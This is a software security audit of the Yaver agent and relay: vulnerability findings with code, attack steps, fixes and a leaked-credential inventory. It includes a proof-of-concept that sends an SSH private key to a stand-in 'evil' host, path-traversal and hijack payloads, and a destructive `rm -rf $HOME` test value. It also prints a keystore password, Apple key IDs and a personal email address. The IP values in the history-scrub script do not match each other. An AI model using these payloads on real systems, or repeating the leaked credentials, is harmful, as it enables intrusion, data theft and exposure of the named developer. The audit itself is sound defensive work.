# Yaver Security Audit — 2026-05-02

> **Status (as of 2026-05-02)**: Critical and High findings shipped in
> agent 1.99.111 (commit `0f524484`). Mobile + web + relay updated
> together for compatibility. Remaining items: git-history scrub
> (still pending — credentials are out of HEAD but old commits retain
> the leaked values), and the verify-android-keystore one-off check.
>
> Client compatibility notes:
> - `/dev/native-bundle` + `/dev/native-assets` accept either signed
>   URLs (mobile-app path) or owner/paired/SDK Bearer tokens (SDK
>   reload path). Loopback 127.0.0.1 is exempt for the dev-preview
>   iframe.
> - `/dev/web-bundle/` requires either a signed query string OR a
>   `yaver-dev-web-sig` cookie set by `/dev/web-bundle/info`. The web
>   dashboard iframe gets the cookie automatically.
> - `/repos/list` is allowed for full-scope guests (read-only); other
>   `/repos/*` endpoints are owner-only.
> - `/agent/runners` is exact-match-only — `/agent/runners/test` (RCE
>   surface) is blocked even for full-scope guests.
> - `/info` redaction applies to ALL non-owner callers (guest tier,
>   support session, host-share peer, SDK delegation).
> - Default support session is read-only; `yaver support start --shell`
>   is the explicit opt-in for `/exec` + `/ws/terminal` + `/browser/`.
> - Relay `--allow-open` flag now required to start without password
>   or Convex URL. `RELAY_ADMIN_TOKEN` env var gates `/admin/*`.
> - Mobile presence polling uses 50-id batches via the relay's new
>   ?ids= cap; clients gracefully fall back to per-device polling
>   on relay 400.


**Threat model**: Yaver agent running `yaver serve` on a public-IP machine (HTTP :18080, HTTPS :18443, QUIC :4433, UDP beacon :19837). Open-source code on GitHub. Attacker has full source code, no credentials, can issue any HTTP/UDP/QUIC traffic, can run modified `yaver` binary, may hold a low-trust legitimate guest token.

**Goal**: prevent RCE, prevent reading code/secrets, prevent token theft, prevent persistence, prevent cross-tenant pivot.

**Scope**: 6 parallel deep audits — auth middleware, guest scope, RCE vectors, MCP routing, relay tenancy, full git-history credential scan.

**Counts**: 9 critical, 17 high, 13 medium, 8 low. 10 confirmed credential / PII leaks in repo + history.

---

## Critical findings (drop everything)

### C-1. Relay deviceId hijack — full session takeover
**File**: `relay/server.go:312-354`, `relay/protocol.go:23-29`

The QUIC registration handshake validates only the relay password. The `Token` field is checked `!= ""` and never authenticated. Tunnel-table swap is last-writer-wins.

```go
server.go:312    if err := json.Unmarshal(data, &reg); err != nil || reg.Type != "register" { ... }
server.go:321    if reg.DeviceID == "" || reg.Token == "" { ... }    // empty-string only
server.go:330    if !s.validatePassword(reg.Password) { ... }
server.go:347    s.tunnels[reg.DeviceID] = tunnel                     // overwrite unconditionally
server.go:354    old.conn.CloseWithError(0, "replaced")
```

**Attack**:
1. Attacker enumerates target deviceId (visible in `/tunnels`, beacons, mobile UI, hostnames, `/presence`).
2. Connects QUIC with `RegisterMsg{DeviceID: victim.deviceId, Token: "x", Password: SHARED}`.
3. Relay swaps tunnel ownership. Every `/d/<victim>/...` HTTP request now forwards to attacker, including `Authorization: Bearer …` headers.
4. Bonus: relay auto-promotes `?token=<jwt>` to `Authorization: Bearer …` (server.go#L741), so SSE/EventSource bearers leak too.
5. Bonus 2: `Token` field is logged/handled server-side — a malicious or compromised relay also lifts every connecting agent's bearer.

**Severity**: CRITICAL.

**Fix**:
- Convex-side `validate-tunnel(deviceId, token) → userId` callback that asserts the token's userId actually owns the deviceId.
- Refuse-on-collision instead of replace-on-collision.
- Long-term: per-device ed25519 keypair, sign nonce-from-relay, drop shared password.

### C-2. Support session = full RCE, not "scoped subset"
**File**: `desktop/agent/support.go:50-67`

```go
var supportAllowedPrefixes = []string{
    "/support/", "/health", "/info",
    "/agent/status", "/agent/capabilities", "/agent/runners",
    "/files/roots", "/files/list", "/files/read", "/files/raw",
    "/exec", "/exec/", "/ws/terminal",
    "/browser/", "/streams", "/streams/",
}
```

CLAUDE.md sells support sessions as TeamViewer-style scoped, but a redeemed support bearer can run `bash -c <anything>` and open a PTY. Combined with C-3 (rate-limit off + non-CT compare on 6-char code), an active support window is brute-forceable from the public internet (~30h at 10k/s for 32^6 ≈ 1.07B keyspace).

**Severity**: CRITICAL.

**Fix**: remove `/exec`, `/exec/`, `/ws/terminal`, `/browser/` from `supportAllowedPrefixes`. If interactive shell is the intended product feature, gate behind explicit per-session opt-in flag and force-route through `ContainerRunner`.

### C-3. `POST /deploy/webhook` unauth when WebhookSecret empty
**File**: `desktop/agent/deploy_pipeline.go:318-341`

HMAC sig is only verified if `cfg.WebhookSecret != ""`. Default is empty. `?project=/abs/path` taken from query, passed to `RunDeploy(dir, "webhook")` → bash → RCE.

**Severity**: CRITICAL.

**Fix**: refuse the request unless `WebhookSecret` set; route through `s.auth(...)` and only fall through on a known sig header.

### C-4. `/dev/native-bundle`, `/dev/web-bundle/`, `/dev/index.bundle` — unauth source disclosure
**Files**: `httpserver.go:653-669`, `devserver_http.go:2057,3201,3280`, `build_web.go:604`

While `yaver dev start` is running on a public IP, anyone can `curl` the compiled Hermes/web bundle (transpiled source) or proxy through to Metro's source-mapped output (full original source). Comment in code admits "No auth — serves proxied dev content."

**Severity**: CRITICAL during active dev sessions.

**Fix**: HMAC-signed per-build URLs (same pattern as `handleBlobPublic`), or bind to 127.0.0.1 unless `--allow-ips` is set.

### C-5. `X-Relay-Password: <any non-empty>` bypasses public-recovery block
**File**: `desktop/agent/recovery_transport.go:106-140`

```go
if strings.TrimSpace(r.Header.Get("X-Relay-Password")) != "" {
    return recoveryIngressVerdict{Allowed: true, Transport: "relay", Reason: "private relay"}
}
```

Header *value* never validated. Removes the "no recovery from public internet" defense layer for `/auth/recover`, opening pair-code / device-code surface to brute force from anywhere.

**Severity**: CRITICAL.

**Fix**: constant-time compare against `Config.RelayPassword` / `Config.CachedRelayPassword`.

### C-6. Guest with `scope=deploy` → owner RCE on `primary` via `ops` proxy
**Files**: `ops.go:170-233`, `ops_resolve.go:22-54`, `agent_mesh_remote.go:633-645`, `ops_deploy.go:30-143`

Four layered bugs:
1. `dispatchOps` runs `proxyToDevice` *before* the `Caller=="guest" && !AllowGuest` check — per-verb guest gates only enforced locally.
2. When proxying, `Authorization` is rewritten to host's owner token; original guest scope NOT forwarded. Receiving primary sees `caller="owner"`.
3. `machine="primary"` resolves via host's Convex token to host's primary device.
4. `ops deploy` has `AllowGuest=true`, accepts `Args []string` joined with spaces and handed to `sh -c`, sandbox off by default.

PoC:
```json
POST /ops  (auth: guest token, scope=deploy)
{ "machine": "primary", "verb": "deploy",
  "payload": { "target":"cloudflare",
               "workDir":"/Users/owner",
               "args": ["--token=$(curl https://evil/$(cat ~/.ssh/id_rsa | base64))"] } }
```

A deploy-tier guest gets full shell on user's primary Mac.

**Severity**: CRITICAL.

**Fix**:
- Re-order `dispatchOps` to gate guests before remote routing.
- Refuse `machine` resolution for guest callers.
- Argv-mode + escape `Args`.
- Forward signed delegated-context headers and re-validate at destination.

### C-7. Feedback file-write path traversal — RCE for any feedback-only guest
**File**: `desktop/agent/feedback.go:191-220`, reachable via `feedback_http.go:115-119` (`POST /feedback`)

```go
reportDir := filepath.Join(fm.baseDir, report.ID)              // attacker controls report.ID
filePath := filepath.Join(reportDir, name)                     // attacker controls name (multipart Filename)
os.WriteFile(filePath, data, 0600)
```

Both `metadata.id` and per-multipart `Filename` join to disk. `filepath.Join` collapses internal `..` but does NOT block traversal.

PoC: feedback-only guest sends `metadata={"id":"../../../../tmp/x"}` + multipart `Filename="payload"` → writes `/tmp/payload` with attacker bytes. Pivots: overwrite `~/.ssh/authorized_keys`, `~/.npmrc`, `~/.aws/credentials`, `~/.yaver/config.json` (contains owner bearer), `~/.yaver/vault.enc.tmp`.

**Severity**: CRITICAL — exploitable by any end-user of an app embedding the Feedback SDK.

**Fix**:
- Validate `report.ID` regex `^[A-Za-z0-9_-]{1,64}$` (or always overwrite to fresh UUID before any join).
- `name = filepath.Base(name)`; reject if changed or contains `/`, `\`, or starts with `.`.

### C-8. Feedback-fix workdir is guest-controlled — mounts attacker dir into container
**File**: `desktop/agent/feedback_http.go:300-317`

```go
if report.Project.ProjectPath != "" {
    opts.WorkDir = report.Project.ProjectPath        // attacker value
} else if projectName != "" {
    if mp := findMobileProjectByName(projectName); ...   // never reached if attacker sets path
```

The "force-containerize feedback-only guest tasks" claim is contradicted: `report.Project.ProjectPath` is read straight from the upload before the trusted `findMobileProjectByName` fallback. Container then bind-mounts that path as `/workspace`.

PoC: upload feedback with `metadata={"project":{"projectPath":"/Users/owner/.ssh"}}`, then `POST /feedback/{id}/fix`, AI runs in `/workspace` = `/Users/owner/.ssh`, output streams back via task SSE.

**Severity**: CRITICAL.

**Fix**: ignore `report.Project.ProjectPath` from upload; always re-resolve server-side via `findMobileProjectByName`.

### C-9. Relay `/admin/set-password` unauth when no password set; open-mode default
**File**: `relay/server.go:141-143, 623-678`

```go
// validatePassword
if s.convexURL == "" && s.getPassword() == "" {
    return true   // open mode — anyone can do anything
}
// /admin/set-password
if currentPw := s.getPassword(); currentPw != "" {
    if req.CurrentPassword != currentPw { 401 }
}
// else: anyone can set
```

A relay launched without `RELAY_PASSWORD` (e.g. docker-compose default empty env) is fully open AND first-write-wins on `/admin/set-password`.

**Severity**: CRITICAL for misconfigured relays.

**Fix**: refuse to start without `--allow-open` flag when neither password nor Convex URL set; require admin-side env-var bearer for `/admin/*`.

---

## High findings

### H-1. Non-constant-time agent-token compares (timing oracle on master credential)
**Files**: `httpserver.go:1652,1799,1929`, `quic.go:159`, `multiuser_http.go:187`, `phone_data_http.go:149`

Every fast-path agent-token check uses `token == s.token`. Network timing leaks the token byte-by-byte. The agent token grants full `/exec`, `/vault/*`, `/agent/shutdown` access.

**Fix**: single `tokenEqual()` helper using `subtle.ConstantTimeCompare`.

### H-2. Same family — webhook secret, pair code, support code/bearer
**Files**: `httpserver.go:4034`, `auth_pair.go:342`, `support.go:144`, `support_http.go:100-125`

Use `==` / `EqualFold`. All are brute-force-attractive surfaces.

**Fix**: `subtle.ConstantTimeCompare` or `hmac.Equal`. Combine with H-15 (rate-limit on by default).

### H-3. Paired-token cache truncated to 16-hex prefix, no Convex revalidation
**File**: `desktop/agent/paired_tokens.go:189-202`

Compared as 16-hex-prefix non-CT; no Convex revalidation → long-lived offline credential survives session revocation.

**Fix**: full SHA + CT compare. Add periodic Convex revalidation with 24h grace TTL on outage.

### H-4. `/agent/runners/test` reachable by full-scope guest (prefix collision)
**Files**: `guest_scope.go:60-61`, `runner_test_http.go:108`

`guestFullAllowedPrefixes` includes `/agent/runners` as prefix → `/agent/runners/test` matches → spawns AI runners on host's API budget.

**Fix**: switch to "exact-match OR exact-prefix-with-slash" allowlist matching.

### H-5. `/repos/*` reachable by full-scope guests despite docs saying owner-only
**Files**: `guest_scope.go:64`, `httpserver.go:781-786`

`/repos/clone`, `/repos/credentials`, `/repos/delete` reachable. CLAUDE.md disagrees with code.

**Fix**: remove `/repos/` from `guestFullAllowedPrefixes`.

### H-6. `InsecureSkipVerify: true` on TLS clients
**Files**: `desktop/agent/client.go:36`, `main.go:8163-8164`, `relay/tunnel.go:86-88`

QUIC/relay TLS clients accept any cert. TLS fingerprint announced via `/health` and beacon but never validated. Trivial MITM on hostile networks.

**Fix**: pin relay cert fingerprint in agent (stored alongside relay URL in Convex `platformConfig`).

### H-7. `/errors/ingest` accepts unauth POST
**File**: `desktop/agent/error_tracker.go:191`, route `httpserver.go:931`

Anyone can POST arbitrary error events. Disk fill, host-existence leak.

**Fix**: require auth, or HMAC-sign client error reports.

### H-8. `/vibing/execute` lets full-scope guest pivot global workdir
**File**: `desktop/agent/vibing.go:1444-1532`

```go
s.taskMgr.workDir = req.ProjectPath   // process-global mutation, no GuestCanAccessProject check
```

`/tasks` POST handler does check; this one does not. Side effect: concurrent owner tasks inherit guest's chosen workdir.

**Fix**: project-gate before assignment; pass workDir through `TaskCreateOptions.WorkDir` instead of mutating global.

### H-9. Symlink traversal in `/files/*`
**File**: `desktop/agent/files_browser.go:106-198,409-423`

`safeJoin` is purely textual — no `EvalSymlinks`. Symlink dropped into project root reads any host file via `/files/raw`.

**Fix**: `filepath.EvalSymlinks(abs)` after `safeJoin`, re-check inside `absRoot`. Reject symlinks for read paths.

### H-10. Tar bundle import preserves setuid/setgid, weak `..` check
**File**: `desktop/agent/transfer.go:917-936`

```go
if strings.Contains(header.Name, "..") { continue }
os.Chmod(target, os.FileMode(header.Mode))   // preserves setuid bits
```

Symlink/hardlink entries silently dropped (currently safe but no explicit reject).

**Fix**: `filepath.IsLocal` (Go 1.20+); strip mode bits via `& 0o0777`; explicitly reject `tar.TypeSymlink` / `TypeLink`.

### H-11. git arg-injection — no `--` separator
**Files**: `git_provider.go:1252-1258`, `git_http.go:353,390,397,403`, `transfer.go:330,337`

`req.URL`, `req.Branch`, `req.Files` reach `git clone`/`checkout`/`add` as positional args without `--`. Modern git refuses URLs starting with `-` but accepts other option-injection (e.g. `--config=core.fsmonitor=...`).

**Fix**: pass `--` before user-supplied args; reject inputs matching `^-`.

### H-12. `/browser/*` SSRF — no URL allowlist
**File**: `desktop/agent/browser.go:267-288`

`chromedp.Navigate(url)` with no scheme/host validation. Reaches AWS/GCP metadata (`169.254.169.254`), `file://`, `view-source:file://`. Especially bad with C-2 (support guest gets `/browser/`).

**Fix**: reject URLs whose host resolves to private/link-local/loopback. Resolve in Go before navigation. Allowlist schemes: `http`, `https`, `about`, `data`.

### H-13. `X-Yaver-Guest*` request headers trusted before server config
**File**: `desktop/agent/ops_execution_plan.go:146-160`, `httpserver.go:1258-1278`

`X-Yaver-GuestAllowedProjects` read from inbound request first, only falls through to server config if header is empty. `applyDelegatedGuestSDKHeaders` doesn't strip `X-Yaver-GuestScope`/`AllowedProjects` either. Guest spoofs broader allow-list.

**Fix**: `r.Header.Del("X-Yaver-Guest*")` in `allowGuest()` before re-stamping; same in `applyDelegatedGuestSDKHeaders`.

### H-14. Relay `/tunnels` enumerates connected devices unauth
**Files**: `relay/server.go:451,513-557`, `1358`

Returns deviceId prefixes (8 chars), real public IPs, expose-routes. Combined with relay's prefix-match in `/d/<8chars>/...` (server.go:773-783), 8-char prefix is enough to route.

**Fix**: auth-gate `/tunnels`, `/admin/*`, `/presence`. Require full deviceId in `/d/`. Slim `/health` to `{ok, version}`.

### H-15. `validateRelayPassword` plaintext storage + O(N) full-table scan
**File**: `backend/convex/userSettings.ts:471-480`, `schema.ts:421`

`userSettings.relayPassword: v.optional(v.string())` — plaintext in Convex. Lookup is `find()` over full table. Privacy contract violation + Convex DoS amplification.

**Fix**: hash relay passwords client-side (sha256), index `by_relayPasswordHash`. Or move to ticket-based auth entirely.

### H-16. `?__rp=<password>` in URL — leaks via logs / Referer / history
**File**: `relay/server.go:717-728`

```go
if relayPw == "" {
    relayPw = r.URL.Query().Get("__rp")
}
```

Logged by nginx access logs (full `$request`), Cloudflare logs, browser history, cross-origin Referer headers, Convex ingress logs.

**Fix**: short-lived (5-min) opaque ticket: web dashboard → Convex `getRelayTicket(deviceId)` → `?__rt=<random>`. Or strip `__rp` from nginx logs as immediate mitigation.

### H-17. `/info` redaction too narrow — full guests/SDK callers see hostname + workDir
**File**: `desktop/agent/httpserver.go:2235`

Redaction only fires for `GuestScopeFeedbackOnly`. Full-scope guests, host-share peers, SDK callers all see hostname, `/Users/<username>/...` workDir, hwid, runner config. CLAUDE.md privacy contract forbids absolute paths and usernames flowing off-machine.

**Fix**: apply redaction to all non-owner callers.

---

## Medium findings

### M-1. Beacon broadcasts bootstrap passkey in plaintext UDP by default
**File**: `desktop/agent/beacon.go:33`, `auth_bootstrap.go:96-110`

In bootstrap mode, 6-char passkey ships in LAN UDP beacon. Open Wi-Fi attacker reads beacon → POSTs `/auth/pair/submit` → owns the box. Opt-out exists (`YAVER_BOOTSTRAP_NO_BEACON_PK=1`) but default is wrong for hostile-network model.

**Fix**: default to `na:true` only (no `pk` in beacon); require explicit passkey entry on phone.

### M-2. Beacon `th` fingerprint enables cross-network user correlation
**File**: `desktop/agent/beacon.go:19-43`

`th` = sha256(userId)[:8] — stable across networks. Adversary on multiple LANs correlates "same user."

**Fix**: rotate `th` daily with per-day salt; or use per-installation random opaque token.

### M-3. Generic rate-limiter OFF by default
**File**: `desktop/agent/ratelimit.go:91-112`

`Enabled bool` defaults false. `/support/redeem`, `/auth/pair/*`, `/vault/*`, `/auth/factory-reset` use generic limiter and are therefore unrate-limited.

**Fix**: default `Enabled = true` with sane defaults (RPM=120 already set).

### M-4. CORS `Access-Control-Allow-Origin: *`
**File**: `desktop/agent/httpserver.go:2051-2062`, `relay/server.go:1358`

Universal-origin CORS on every response. Acceptable today (auth via header not cookie) but should narrow.

**Fix**: configurable allowlist (e.g. `https://yaver.io`, `https://*.yaver.io`).

### M-5. 200 MB body buffer — DoS / amplification
**Files**: `relay/tunnel.go:295-300`, `relay/server.go:1242-1244`

Per-request 200 MB buffer for `/dev/*` (and 200 MB blanket on expose path). Memory exhaustion + bandwidth amplification. SSE detection by substring `"/output"` triggers unlimited streaming for non-SSE paths.

**Fix**: stream request body through QUIC; cap per-IP concurrent open streams; cap per-userId concurrent buffered bytes.

### M-6. Auto-subdomain ignores reserved list
**File**: `relay/server.go:368-379`

`<deviceId>.<exposeDomain>` auto-provisioned without consulting `reserved` map. Combined with C-1, attacker registers `deviceId="admin"` → claims `admin.public.yaver.io`.

**Fix**: apply reserved list; validate deviceId shape (uuid-v4 or 8+ hex).

### M-7. `pushPresence` uses static shared secret
**File**: `relay/convex_presence.go:84-85`

`X-Relay-Secret` static bearer. Compromised relay → forge presence + `assignedUrl` for any deviceId → dashboard points at attacker server.

**Fix**: per-relay HMAC over `(deviceId, online, ts, assignedUrl)`; Convex verifies. Per-relay key, rotated independently.

### M-8. No QUIC/connection/stream caps on relay
**File**: `relay/server.go:264-267`

`quic.Config` sets only `MaxIdleTimeout` and `KeepAlivePeriod`. Default `MaxIncomingStreams` unbounded. No per-IP connection cap, no `/d/*` rate limit, no `/bus/publish` rate limit. `bus.go:58` per-subscriber buffer 256 but no cap on subscribers per userId.

**Fix**: `MaxIncomingStreams: 256`, per-IP cap (16 tunnels), bound `validatedPw`/`pwUserIDs` (LRU 10k), cap subscribers per userId (32).

### M-9. Caches not invalidated on password rotation
**File**: `relay/server.go:126-130`

`setPassword` swaps password but doesn't clear `validatedPw` / `pwUserIDs`. Old password works for 5 more minutes.

**Fix**: clear caches and force-disconnect existing tunnels on rotation.

### M-10. Path-prefix matching not segment-aware
**Files**: `desktop/agent/guest_scope.go:160`, `httpserver.go:1250,1287`, `support.go:150`

Every allowlist match is `strings.HasPrefix`. Future route `/agent/runners-debug` would silently inherit guest access. Also: `/feedback/..%2ftasks` arrives as `/feedback/../tasks` and passes prefix check (Go ServeMux happens to route correctly today, but fragile).

**Fix**: `path.Clean(r.URL.Path)` before matching; reject if Clean changes value. Use exact-match-or-segment-prefix.

### M-11. `ops` execution plan project-gating only enforced locally
**File**: `desktop/agent/ops_execution_plan.go:198-214`

Guest scope project check runs on local agent; receiving primary device has no record once routed remotely.

**Fix**: forward signed delegated-context headers; receiving agent re-runs gate.

### M-12. `target.DeviceID` interpolated unescaped in proxy URLs
**File**: `desktop/agent/agent_mesh_remote.go:336`, `backend/convex/devices.ts:303`

Convex deviceId validator is just `v.string()` with no shape constraint. Bounded SSRF — can't pivot to other tenants but can register own device with weird id.

**Fix**: Convex regex `^[A-Za-z0-9._:-]{8,128}$`; `urlPathEscape` before concat.

### M-13. `/files/read` DoS on FIFO / `/proc/self/mem`
**File**: `desktop/agent/files_browser.go:158-198`

`os.Stat` returns Size=0 for special files. FIFO blocks `os.Open` until something writes — connection-DoS pinning handler goroutines.

**Fix**: `if !info.Mode().IsRegular() { 400 }` before `os.Open`.

---

## Low findings

### L-1. `report.ID` collision — guest can overwrite their own report
File: `feedback.go`. UUID only generated when ID empty. Combined with C-7.

### L-2. `findMobileProjectByName` matcher uses `EqualFold` — no Unicode normalization
Cyrillic 'а' ≠ Latin 'a'. Confirmed not exploitable in current code; safe direction.

### L-3. `console_terminal.go` `?shell=` accepts arbitrary executable path
**File**: `desktop/agent/console_terminal.go:71-79`. Owner-only but allows `?shell=~/Downloads/poison`.
**Fix**: allowlist (`/bin/bash`, `/bin/zsh`, `/bin/sh`, `cmd`, `pwsh`).

### L-4. `setup-relay.sh` echoes password to stdout
**File**: `scripts/setup-relay.sh:422-424`. CI logs capture.
**Fix**: don't echo; print "Password configured (saved on server)".

### L-5. Relay `/admin/bandwidth`, `/admin/status` unauth
Per-device usage enumeration; "is password set" reconnaissance.
**Fix**: auth-gate.

### L-6. `chat_widget.go:128-173` unauth POST — spam vector
Disk fill + inbox flood.
**Fix**: per-IP rate limit; honeypot/captcha.

### L-7. `/auth/status` and `/auth/pair/info` leak bootstrap state / hostname / private LAN URLs
**Files**: `auth_recover.go:742`, `auth_pair.go:252-322`.
**Fix**: require code as query param to receive useful metadata; strip hostname/targetUrls for unauth callers.

### L-8. CORS allow-credentials future risk
If anyone later adds cookie-based auth, current `*` CORS becomes a CSRF surface.

---

## Git history credential leaks

### Confirmed real leaks

| # | What | Where | Status | Severity |
|---|------|-------|--------|----------|
| 1 | Android keystore password `yaver2024release` | 2 historical commits + currently in CLAUDE.md | Active | CRITICAL |
| 2 | Hetzner relay public IP `198.51.100.10` | `.github/workflows/{relay-deploy-binary,relay-deep-diagnose,sse-deep-trace}.yml`, `backend/convex/seed.ts`, `docs/wsl2-relay-troubleshooting.md` | In HEAD | HIGH |
| 3 | Hetzner test box public IP `198.51.100.20` | `desktop/agent/config.go`, `desktop/agent/public_endpoints_test.go`, `scripts/sync-rn-project-to-test-box.sh`, `sdk/feedback/react-native/src/__tests__/AuthDevices.test.ts` | In HEAD | HIGH |
| 4 | Apple Issuer UUID `7bd9329e-49b0-440a-97ed-873c74244c12` | CLAUDE.md, README.md, deploy.md | In HEAD | HIGH |
| 5 | App Store Connect Key ID `77Z6B543D5` | CLAUDE.md (3x), README.md (2x), deploy.md, docs/vault-and-deploy.md (2x) | In HEAD | HIGH |
| 6 | Apple Team ID `5SJZ4KA39A` | CLAUDE.md (3x), README.md (2x), deploy.md, docs/vault-and-deploy.md, mobile pbxproj | In HEAD | MEDIUM |
| 7 | Personal `IstanbulDigerK4.pdf` (11 MB Turkish PDF) | Removed from HEAD in 688f6d34, recoverable via blob `9739662cc9d76f4df41cabccbed610f0af5742bd` | History only | HIGH (PII) |
| 8 | `.claude/projects/.../memory/*.md` | Removed from HEAD, in history; reveals `<workspace>/talos/` path | History only | LOW (PII) |
| 9 | Personal email `kivanc.cakmak@icloud.com` | `backend/cleanup-user.mjs:22`, `backend/convex/developerLogs.ts:6`, `backend/convex/http.ts:7` | In HEAD | MEDIUM (PII) |
| 10 | Tailscale IP `100.64.0.78` | `desktop/agent/ssh_resolve_test.go:6,7,8,29` | In HEAD | LOW |

### Verified clean

- `npm_…` npm tokens
- `pypi-…` PyPI tokens
- `ghp_/gho_/ghu_/ghs_/github_pat_` GitHub tokens
- `sk-ant-…`, `sk-proj-…` Anthropic/OpenAI
- `AKIA…` AWS, `AIza…` Google API, `ya29.…` Google OAuth
- `xoxb-/xoxp-/xoxa-` Slack
- `tskey-…` Tailscale auth keys
- `BEGIN PRIVATE KEY` / `BEGIN CERTIFICATE`
- JWTs (full triplets)
- `.p8`, `.keystore`, `.jks`, `.p12`, `.pem`, `.key` files — never committed
- Google service-account JSON
- Stripe/Twilio/Sentry/Resend secrets
- `.env`/`.npmrc` with values
- `RELAY_PASSWORD=` literal
- `HCLOUD_TOKEN=` literal

---

## Remediation order

### Day 0 — rotate active credentials
1. Reset Android upload-keystore password (Play Console → Settings → App integrity → Upload key reset). Pair with the existing `12:63:75:D8` SHA1 mismatch — both rotated in one window.
2. Rotate App Store Connect API key `77Z6B543D5` — issue new `.p8`, revoke old.

### Day 1 — show-stoppers
3. C-2 (support scope): drop `/exec`, `/exec/`, `/ws/terminal`, `/browser/` from `supportAllowedPrefixes`. One-line.
4. C-3 (deploy webhook): require `WebhookSecret`.
5. C-7 / C-8 (feedback): regex-validate `report.ID`, `filepath.Base` on `Filename`, ignore client-supplied `ProjectPath`.
6. C-1 / C-9 (relay): wire `Token` validation through Convex; refuse-on-collision; require admin token for `/admin/*`; refuse open-mode start without `--allow-open`.
7. C-6 (ops remote pivot): re-order `dispatchOps` to guest-gate before proxy; refuse `primary` resolution for guest callers; argv-mode `ops deploy`.

### Week 1
8. C-4 (dev bundle disclosure): HMAC-signed bundle URLs.
9. C-5 (recovery): constant-time compare on `X-Relay-Password`.
10. H-1 / H-2 / H-3: single `tokenEqual()` helper; replace every site.
11. H-4 / H-5: tighten `/agent/runners` and `/repos/` allowlist; segment-aware match (M-10).
12. H-6 (TLS pinning): pin relay cert in agent.
13. H-9 (symlink): `EvalSymlinks` after `safeJoin`.
14. H-13 (header trust): strip `X-Yaver-Guest*` in `allowGuest()` before re-stamping.
15. M-3 (rate-limit on by default).

### Week 2 — git history scrub
```bash
# 1. Fix HEAD references first (separate commit before scrub)
#    - Replace IPs in workflows with ${{ secrets.RELAY_SSH_HOST }} / YAVER_CI_SSH_HOST_PRIMARY
#    - Replace IPs in tests with TEST-NET-1 (192.0.2.x, 198.51.100.x, 203.0.113.x)
#    - Replace Apple constants in docs with ${APP_STORE_KEY_ISSUER} placeholders
#    - Move kivanc.cakmak@icloud.com allowlist to Convex env

# 2. Then scrub
git filter-repo --replace-text <(cat <<EOF
yaver2024release==>***REDACTED***
198.51.100.10==>198.51.100.10
198.51.100.20==>198.51.100.20
7bd9329e-49b0-440a-97ed-873c74244c12==>***ISSUER***
77Z6B543D5==>***KEYID***
EOF
)
git filter-repo --invert-paths --path IstanbulDigerK4.pdf --path .claude/

# 3. Force-push to GitHub (coordinate; rewrites history)
git push --force-with-lease github main

# 4. Verify
git log -p --all | grep -E '(yaver2024release|46\.224\.110\.38|157\.180\.114\.179|7bd9329e-49b0-440a-97ed-873c74244c12|77Z6B543D5|IstanbulDigerK4)'
```

### Week 3+ — defense-in-depth
16. Default-on rate limiting; per-IP caps on QUIC + `/d/*` + `/bus/*`.
17. Origin-actor headers + signed delegation context for proxied guest calls.
18. `containerize_guests=true` default when Docker available.
19. Bound caches and invalidate on rotation.
20. Replace `?__rp=` with `?__rt=` ticket.
21. Tar bundle import: strip setuid bits, `filepath.IsLocal`, reject symlinks.
22. `git ... --` separator on every external git invocation.

---

## Most-exploitable today (priority order)

1. **C-7** — feedback file-write traversal. Any signed-up end-user with a Yaver app embedding the SDK can RCE the developer's machine.
2. **C-3** — webhook RCE. Drive-by scan finds it.
3. **C-1** — relay hijack. Anyone with the public relay password steals every other tenant's traffic.
4. **#1 in git scan** — Android keystore password committed plaintext on a public repo.

---

## Test recommendations

- `support_test.go::TestSupportNoExec` — assert `/exec`, `/ws/terminal`, `/browser/` NOT in `supportAllowedPrefixes`.
- `feedback_test.go::TestReportIDTraversal` — POST `metadata.id="../etc/x"` → 400.
- `feedback_test.go::TestFilenameTraversal` — multipart `Filename="../x"` → 400.
- `feedback_http_test.go::TestFixIgnoresUserProjectPath` — guest-supplied ProjectPath ignored.
- `files_browser_test.go::TestSymlinkRejected` — symlink in project root → 403.
- `vibing_test.go::TestExecuteRespectsGuestProjects` — full guest with `allowedProjects=[A]` POST `projectPath=B` → 403.
- `deploy_script_gen_test.go::TestPathInjection` — fuzz `App`, `Path` with shell metacharacters → assert generated script does NOT contain unescaped versions.
- `allowlist_test.go::TestAllAllowlistsCoveredByTripwire` — every `*AllowedPrefixes` slice is checked, not just the two.
- `ops_test.go::TestGuestCannotPivotPrimary` — `ops("primary", "run", ...)` from guest → unauthorized BEFORE proxy fires.
- `ops_deploy_test.go::TestDeployArgsAreShellSafe` — supply `args:["$(rm -rf $HOME)"]` → rejection or argv-quoting.
- `convex_privacy_test.go` — extend forbidden-keys list; assert deviceId regex.
- `relay_test.go::TestDeviceIDHijack` — register deviceId twice from different connections → second rejected unless presents proof.
